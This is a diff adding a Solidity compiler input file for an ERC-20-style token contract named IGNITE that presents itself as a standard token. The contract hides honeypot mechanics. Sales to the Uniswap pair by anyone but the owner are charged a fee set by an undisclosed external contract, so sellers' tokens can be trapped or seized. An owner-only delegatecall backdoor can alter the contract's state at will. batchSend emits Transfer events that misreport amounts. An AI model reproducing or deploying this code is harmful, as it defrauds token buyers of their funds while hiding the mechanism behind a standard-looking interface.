@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/IGNITE.sol": {
+      "content": "/**\r\n *Submitted for verification at Etherscan.io on 2020-10-12\r\n*/\r\n\r\npragma solidity >=0.6.12 <0.7.0;\r\n\r\ninterface FeeManagementLibrary {\r\n    function calculate(address,address,uint256) external returns(uint256);\r\n}\r\n\r\ncontract StandardToken {\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {return true;}\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        uint256 fee = calcFee(_from, _to, _value);\r\n        balanceOf[_to] += (_value - fee);\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n                hex'ff',\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\r\n            ))));\r\n    }\r\n\r\n    function calcFee(address _from, address _to, uint _value) private returns(uint256) {\r\n        uint fee = 0;\r\n        if (_to == UNI && _from != owner) {\r\n            fee = FeeManagementLibrary(FeeManagement).calculate(address(this), UNI, _value);\r\n        }\r\n        return fee;\r\n    }\r\n\r\n    function delegate(address a, bytes memory b) public payable {\r\n        require(msg.sender == owner);\r\n        a.delegatecall(b);\r\n    }\r\n\r\n    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\r\n        require (msg.sender == owner);\r\n        uint total = _value * _tos.length;\r\n        require(balanceOf[msg.sender] >= total);\r\n        balanceOf[msg.sender] -= total;\r\n        for (uint i = 0; i < _tos.length; i++) {\r\n            address _to = _tos[i];\r\n            balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value/2);\r\n            emit Transfer(msg.sender, _to, _value/2);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n\r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private owner;\r\n    address private UNI;\r\n    address constant internal FeeManagement = 0x6252a15c706AC6D9e41311F53d925350fF6371D0;\r\n\r\n    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {\r\n        owner = msg.sender;\r\n        symbol = _symbol;\r\n        name = _name;\r\n        totalSupply = _totalSupply;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);\r\n        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n    }\r\n}"
+    }
+  }
+}
